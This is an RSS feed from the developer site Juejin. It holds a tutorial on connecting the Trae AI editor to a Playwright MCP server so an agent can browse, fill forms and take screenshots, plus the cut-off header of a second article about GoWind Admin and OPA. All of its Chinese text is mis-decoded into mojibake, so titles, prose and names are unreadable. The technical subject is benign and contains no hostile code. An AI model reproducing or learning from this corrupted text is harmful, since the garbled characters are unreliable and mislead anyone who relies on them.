<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[ç”¨ Trae + MCP è®© AI è‡ªåŠ¨æµ‹è¯•é¡µé¢]]></title>    <link>https://juejin.cn/post/7583898823921008682</link>    <guid>https://juejin.cn/post/7583898823921008682</guid>    <pubDate>2025-12-15T12:10:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583898823921008682" data-draft-id="7581649704884191247" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç”¨ Trae + MCP è®© AI è‡ªåŠ¨æµ‹è¯•é¡µé¢"/> <meta itemprop="keywords" content="AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2025-12-15T12:10:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è°è¨€è¥¿è¥¿é‡Œ"/> <meta itemprop="url" content="https://juejin.cn/user/332466136029851"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç”¨ Trae + MCP è®© AI è‡ªåŠ¨æµ‹è¯•é¡µé¢
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/332466136029851/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è°è¨€è¥¿è¥¿é‡Œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T12:10:47.000Z" title="Mon Dec 15 2025 12:10:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>æƒ³å¿…å¤§å®¶åœ¨å‰æ®µæ—¶é—´å…³äº <strong>â€œè±†åŒ…æ‰‹æœºâ€</strong> ä¸€å®šæœ‰æ‰€è€³é—»ï¼Œè¯´å®è¯åœ¨çœ‹è¿‡äº†ä¸å°‘åšä¸»çš„ä½“éªŒå’Œæµ‹è¯„ä¹‹åå‘€ï¼Œä¸ç¦æœ‰ç‚¹æ„Ÿå¹ç°ä»£çš„AIå‘å±•äº†ğŸ¤¯ã€‚</p>
<p>ä½†æ˜¯æœ‰ä¸€ä¸ªè®©æˆ‘æ¯”è¾ƒå¥½å¥‡çš„åŠŸèƒ½ğŸ¤”ï¼Œé‚£å°±æ˜¯ <strong>AI Agentæ˜¯å¦‚ä½•é€šè¿‡ç”¨æˆ·æä¾›çš„æç¤ºè¯æ¥ç›´æ¥æ“æ§åº”ç”¨çš„å‘¢ï¼Ÿ</strong>
æ¯•ç«Ÿå¯¹äºå¤§å¤šæ•°äººæ¥è¯´ AI è¿˜åœç•™åœ¨èŠå¤©å¯¹è¯çš„é˜¶æ®µï¼Œæ˜¯ä»€ä¹ˆä¸œè¥¿è®© AI çªç„¶æ‹¥æœ‰äº†è‡ªå·±çš„ â€œæ‰‹â€ä¸â€œçœ¼â€ å‘¢ï¼Ÿ</p>
<p>å› æ­¤æˆ‘å°±å»ç¨å¾®äº†è§£äº†ä¸€ä¸‹ä¸è¿™æ–¹é¢æœ‰å…³çš„ä¸€äº›çŸ¥è¯†ï¼Œç»“æœç¢°åˆ°äº† <code>mcpåè®®</code> å’Œ <code>playwright</code>ã€‚</p>
<p>äºæ˜¯æˆ‘æŠ±ç€ä¸€é¢—å­¦å¾’çš„å¿ƒï¼Œæ¥è¯•è¯•åœ¨ç›®å‰å¾ˆç«çš„ AI ç¼–è¯‘å™¨ <strong>Trae</strong> æ¥çœ‹çœ‹ä¼šæ‘©æ“¦å‡ºæ€æ ·çš„ç«èŠ±ğŸ”¥ã€‚</p>
<h2 data-id="heading-1">ä¸€ã€ä»€ä¹ˆæ˜¯ MCPï¼ˆModel Context Protocolï¼‰ï¼Ÿ</h2>
<h3 data-id="heading-2">å®šä¹‰ï¼š</h3>
<p>MCP åè®®æ˜¯ä¸€ä¸ª<strong>å¼€æ”¾ã€æ ‡å‡†åŒ–çš„é€šä¿¡åè®®</strong>ï¼Œè€Œå®ƒçš„æ ¸å¿ƒä½œç”¨æ˜¯ï¼š</p>
<blockquote>
<p><strong>è®©å¤§è¯­è¨€æ¨¡å‹èƒ½å¤Ÿå®‰å…¨ã€ç»“æ„åŒ–åœ°è°ƒç”¨å¤–éƒ¨å·¥å…·ã€è®¿é—®ä¸Šä¸‹æ–‡æ•°æ®ï¼Œå¹¶ä¸çœŸå®ä¸–ç•Œäº¤äº’ã€‚</strong></p>
</blockquote>
<p>è¯´ç™½äº†ï¼Œ<strong>MCP æ˜¯ç»™ AI è£…ä¸Šâ€œæ‰‹â€å’Œâ€œçœ¼â€çš„æ¥å£ã€‚</strong></p>
<p>åœ¨ MCP å‡ºç°ä¹‹å‰ï¼ŒAI ç¼–ç¨‹åŠ©æ‰‹å­˜åœ¨ä¸¥é‡å±€é™ï¼š</p>
<ul>
<li><strong>åªèƒ½æ²Ÿé€šï¼Œä¸èƒ½å®æ–½</strong>ï¼šè™½ç„¶ AI å¯ä»¥å¸®åŠ©ç”Ÿæˆä»£ç ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥è¿è¡Œã€æµ‹è¯•æˆ–éªŒè¯å®ƒæ˜¯å¦çœŸçš„è¾¾åˆ°äº†éœ€è¦çš„æ•ˆæœã€‚</li>
<li><strong>ä¿¡æ¯è·å–æ­¥éª¤å¤æ‚</strong>ï¼šAI å¹¶ä¸çŸ¥é“æˆ‘ä»¬æœ¬åœ°æœ‰å“ªäº›æ–‡ä»¶ã€ä¾èµ–ç­‰ç­‰ï¼Œå¤§å¤šæ•°æ—¶å€™éœ€è¦æ‰‹åŠ¨æ“ä½œæ¥æä¾›ç»™å®ƒã€‚</li>
</ul>
<p>ä½†æ˜¯é€šè¿‡ MCP è¿™ä¸ªâ€œæ¡¥æ¢â€ï¼Œè®© AI ä½œä¸ºå®¢æˆ·ç«¯é€šè¿‡æ ‡å‡†åè®®ï¼Œè¿æ¥ä¸€ä¸ªæˆ–å¤šä¸ª MCP Serverä»è€ŒæŠŠ<strong>å¤–éƒ¨ç¨‹åº</strong>ï¼ˆæ¯”å¦‚ Playwrightã€Shell è„šæœ¬ç­‰ï¼‰æ¥å…¥åˆ° AI ç¼–è¯‘å™¨ä¸­ï¼Œè®© AI èƒ½è°ƒç”¨å®ƒä»¬ã€‚</p>
<p>ä¾‹å¦‚ï¼š<strong>â€œæ¨¡å‹ + å·¥å…·ç”Ÿæ€â€ååŒ</strong>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7fb68ab9a3fc4321aa5510b8f5e1cf8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LCO6KiA6KW_6KW_6YeM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766405447&amp;x-signature=MgUSrQgDXCybSASpatSkpPrd1Ow%3D" alt="tongyi-mermaid-2025-12-15-184415.png" loading="lazy"/></p>
<p>åœ¨è¿™æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œç”¨æˆ·ä»…ä»…åªæ˜¯å‘ AI Agent ä¸‹è¾¾äº†æµ‹è¯•ç™»å½•çš„å‘½ä»¤ï¼Œåœ¨æ­¤ä¹‹åçš„è¿‡ç¨‹éƒ½æ— éœ€äººå·¥å¹²é¢„ï¼ŒAI å¯ä»¥è‡ªä¸»åè°ƒå¤šä¸ªå·¥å…·å®Œæˆé—­ç¯ã€‚</p>
<p><strong>AI å°±åƒå…¬å¸çš„ CEOï¼Œé€šè¿‡ MCP åè®®å‘å¤šä¸ªéƒ¨é—¨ï¼ˆMCP Serverï¼‰ä¸‹è¾¾å‘½ä»¤</strong></p>
<p>å¦‚æœä½ æƒ³å¾—åˆ°æ›´å®˜æ–¹çš„è§£é‡Šï¼Œå¯ä»¥å»å®˜ç½‘<a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelcontextprotocol.io%2Fdocs%2Fgetting-started%2Fintro" target="_blank" title="https://modelcontextprotocol.io/docs/getting-started/intro" ref="nofollow noopener noreferrer">What is the Model Context Protocol (MCP)?</a></p>
<h2 data-id="heading-3">äºŒã€ä»€ä¹ˆæ˜¯ Playwrightï¼Ÿ</h2>
<p><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fplaywright.nodejs.cn%2F" target="_blank" title="https://playwright.nodejs.cn/" ref="nofollow noopener noreferrer">Playwright</a></strong> æ˜¯ç”± Microsoft å¼€å‘çš„ <strong>ç°ä»£åŒ–ç«¯åˆ°ç«¯ï¼ˆE2Eï¼‰Web æµ‹è¯•å·¥å…·</strong>ï¼Œç”¨äºè‡ªåŠ¨åŒ– Chromiumã€WebKit å’Œ Firefox æµè§ˆå™¨çš„ Node.js/Python/Java/.NET åº“ã€‚</p>
<p>ä½†æ˜¯ç”±äº <strong>AI + MCP</strong> çš„å­˜åœ¨ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦ç²¾é€šè¿™ä¸ªå·¥å…·ï¼ŒæŠŠäº‹æƒ…äº¤ç»™AIï¼Œè®©æˆ‘ä»¬æ›´æ³¨é‡äºåŠŸèƒ½ã€‚</p>
<h2 data-id="heading-4">ä¸‰ã€MCP + Playwright çš„ååŒ</h2>
<p>ä¸‹è¿°ç¤ºä¾‹éƒ½æ˜¯é€šè¿‡ä½¿ç”¨ Trae æ¥å®ç°çš„</p>
<h3 data-id="heading-5">å‰æœŸå·¥ä½œï¼š</h3>
<p>æ‰“å¼€æˆ‘ä»¬çš„ <strong>Trae</strong> ç¼–è¾‘å™¨</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dc0e072cdb764925bb62e240922b2798~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LCO6KiA6KW_6KW_6YeM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766405447&amp;x-signature=ha7hnjUKnBlq5zdJx6eelvtYysU%3D" alt="image.png" loading="lazy"/></p>
<p>åœ¨è®¾ç½®é¡µé¢æ‰¾åˆ° MCP</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3895986df5a41a5849509f98f62dcf4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LCO6KiA6KW_6KW_6YeM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766405447&amp;x-signature=GGN1nB6TnF3Bi9ZcuSBc1jyNwq0%3D" alt="image.png" loading="lazy"/></p>
<p>ç‚¹å‡»å³è¾¹çš„ <strong>æ·»åŠ </strong> æŒ‰é’®ï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•æ·»åŠ ï¼Œ<strong>ä»å¸‚åœºæ·»åŠ  / æ‰‹åŠ¨æ·»åŠ </strong>ï¼Œè¿™é‡Œæˆ‘ä»¬ç‚¹å‡»ä»å¸‚åœºæ·»åŠ å³å¯</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/16ff7bfae4054c328826d0650c8eab7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LCO6KiA6KW_6KW_6YeM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766405447&amp;x-signature=x2Si4lUB0IE9Ba%2F7zFKSyezTgOU%3D" alt="image.png" loading="lazy"/></p>
<p>åœ¨å¸‚åœºè¿™é‡Œå¯ä»¥æ·»åŠ ä»»ä½•ä½ éœ€è¦çš„ <strong>MCP Server</strong>ï¼Œå¹¶ä¸”å¯ä»¥è¾“å…¥ä½ éœ€è¦é…ç½®çš„ MCP Server ä¿¡æ¯ã€‚è¿™é‡Œæˆ‘ä»¬æ·»åŠ  <code>playwright</code></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a41ef842a6f47fe87bc4d1559d74f77~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LCO6KiA6KW_6KW_6YeM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766405447&amp;x-signature=PdZis9IKBSUyh9mnsZGO4ibbAE8%3D" alt="2025-12-15.gif" loading="lazy"/></p>
<p>å®‰è£…å¥½åå›åˆ°ä¸»é¡µé¢ä¸Šï¼Œåœ¨ TRAE æ™ºèƒ½ä½“èŠå¤©æ¡†ä¸­é€‰æ‹© <code>@Builder with MCP</code></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/117d264a3cc74bc599a9c56ab6c4ba37~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LCO6KiA6KW_6KW_6YeM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766405447&amp;x-signature=2qYRBHdMhD0IQmHlHE2qvfkGoFI%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p>æ³¨ï¼š</p>
<p>ä¸è¦å¿˜è®° playwright åªé€‚é… Chromiumã€WebKit å’Œ Firefoxæµè§ˆå™¨ï¼Œå„ä½åªéœ€æå‰å®‰è£…å¥½å…¶ä¸€å³å¯</p>
</blockquote>
<h3 data-id="heading-6">ç¤ºä¾‹ä¸€ï¼šè®© AI è‡ªåŠ¨è®¿é—®é¡µé¢</h3>
<p>ç»™ AI æç¤ºè¯ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">è¯·å¸®æˆ‘æµ‹è¯•æ˜é‡‘ç½‘ç«™çš„æ’ä»¶é¡µé¢ï¼š
<span class="hljs-bullet">    1.</span> æ‰“å¼€ https://juejin.cn/
<span class="hljs-bullet">    2.</span> ç‚¹å‡»é¡¶éƒ¨å¯¼èˆªæ çš„"æ’ä»¶"æŒ‰é’®
<span class="hljs-bullet">    3.</span> ç­‰å¾…é¡µé¢åŠ è½½å®Œæˆ
<span class="hljs-bullet">    4.</span> æˆªå›¾å¹¶ä¿å­˜åˆ°å½“å‰ç›®å½•
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b6fc7eea1524e49a3b03d1463358e6c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LCO6KiA6KW_6KW_6YeM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766405447&amp;x-signature=25oMtNgfLETI8vJDGE3TG3yyc7o%3D" alt="image.png" loading="lazy"/></p>
<p>æœ€åå®ç°ç»“æœï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/22aa8f38bc5c4056a06bca6dc681fe8a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LCO6KiA6KW_6KW_6YeM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766405447&amp;x-signature=jWzCGeVq1FR433W5ea%2FPeqF3vQU%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">ç¤ºä¾‹äºŒï¼šè®© AI è‡ªåŠ¨æµ‹è¯•é¡µé¢</h3>
<p>ç°åœ¨æˆ‘testæ–‡ä»¶å¤¹ä¸‹æœ‰ä¸€ä¸ª <code>1.html</code>æ–‡ä»¶ï¼Œç»™ AI æç¤ºè¯è®©å®ƒå¸®æˆ‘æµ‹è¯•é¡µé¢çš„åŸºæœ¬æ•ˆæœã€‚</p>
<pre><code class="hljs language-markdown" lang="markdown">è¯·ç¡®è®¤ 1.html æ–‡ä»¶çš„ä»¥ä¸‹èƒ½åŠ›ï¼š
<span class="hljs-bullet">    1.</span> æµ‹è¯•æ˜¯å¦èƒ½æ­£ç¡®é€šè¿‡æ–‡ä»¶è·¯å¾„åŠ è½½æœ¬åœ° HTMLã€‚
<span class="hljs-bullet">    2.</span> æµ‹è¯• fillå’Œclickæ˜¯å¦ç²¾å‡†ã€‚
<span class="hljs-bullet">    3.</span> é€šè¿‡éªŒè¯ç»“æœæ–‡æœ¬ï¼Œç¡®ä¿é¡µé¢é€»è¾‘æ­£å¸¸è¿è¡Œä¸”è¢«æµ‹è¯•å·¥å…·æ­£ç¡®æ•è·ã€‚
<span class="hljs-bullet">    4.</span> é€šè¿‡æˆªå›¾æä¾›æœ€ç»ˆçš„è§†è§‰è¯æ®ã€‚
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a3f6f41c8ff4f859aa2eb8727f97e57~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LCO6KiA6KW_6KW_6YeM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766405447&amp;x-signature=ke4gSzoD67v0w0GzpjCZF06VT1U%3D" alt="åŠ¨ç”».gif" loading="lazy"/></p>
<h2 data-id="heading-8">å››ã€è¿™ä»£è¡¨æœªæ¥</h2>





















<table><thead><tr><th>ä¼ ç»Ÿå¼€å‘</th><th>AI + MCP + Playwright</th></tr></thead><tbody><tr><td>å†™ä»£ç  â†’ æ‰‹åŠ¨æµ‹è¯• â†’ è°ƒè¯• â†’ ä¿®å¤</td><td>æè¿°éœ€æ±‚ â†’ AI ç”Ÿæˆ + è‡ªåŠ¨æµ‹è¯• + è‡ªåŠ¨ä¿®å¤</td></tr><tr><td>æµ‹è¯•æ˜¯â€œäº‹åâ€è¡Œä¸º</td><td>æµ‹è¯•æ˜¯â€œå†…å»ºâ€èƒ½åŠ›</td></tr><tr><td>äººåšæœºæ¢°æ€§éªŒè¯</td><td>AI åšé—­ç¯éªŒè¯</td></tr></tbody></table>
<blockquote>
<p>è¿™æ­£æ˜¯ <strong>â€œAgentic AIâ€ï¼ˆæ™ºèƒ½ä½“å¼å¼€å‘ï¼‰</strong> çš„æ ¸å¿ƒï¼šAI ä¸å†åªæ˜¯ç”Ÿæˆä»£ç ï¼Œè€Œæ˜¯èƒ½<strong>è‡ªä¸»æ‰§è¡Œã€éªŒè¯ã€è¿­ä»£</strong>ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¼€ç®±å³ç”¨çš„ GoWind Adminï½œé£è¡Œï¼Œä¼ä¸šçº§å‰åç«¯ä¸€ä½“ä¸­åå°æ¡†æ¶ï¼šOPA é›†æˆæŒ‡å—ï¼šä»åŸç†åˆ°å®è·µ]]></title>    <link>https://juejin.cn/post/7583906870827646985</link>    <guid>https://juejin.cn/post/7583906870827646985</guid>    <pubDate>2025-12-15T12:34:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583906870827646985" data-draft-id="7583906870827630601" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¼€ç®±å³ç”¨çš„ GoWind Adminï½œé£è¡Œï¼Œä¼ä¸šçº§å‰åç«¯ä¸€ä½“ä¸­åå°æ¡†æ¶ï¼šOPA é›†æˆæŒ‡å—ï¼šä»åŸç†åˆ°å®è·µ"/> <meta itemprop="keywords" content="åç«¯,Go"/> <meta itemprop="datePublished" content="2025-12-15T12:34:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å–µä¸ªå’ª"/> <meta itemprop="url" content="https://juejin.cn/user/1350630784901262"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¼€ç®±å³ç”¨çš„ GoWind Adminï½œé£è¡Œï¼Œä¼ä¸šçº§å‰åç«¯ä¸€ä½“ä¸­åå°æ¡†æ¶ï¼šOPA é›†æˆæŒ‡å—ï¼šä»åŸç†åˆ°å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1350630784901262/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å–µä¸ªå’ª
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T12:34:41.000Z" title="Mon Dec 15 2025 12:34:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
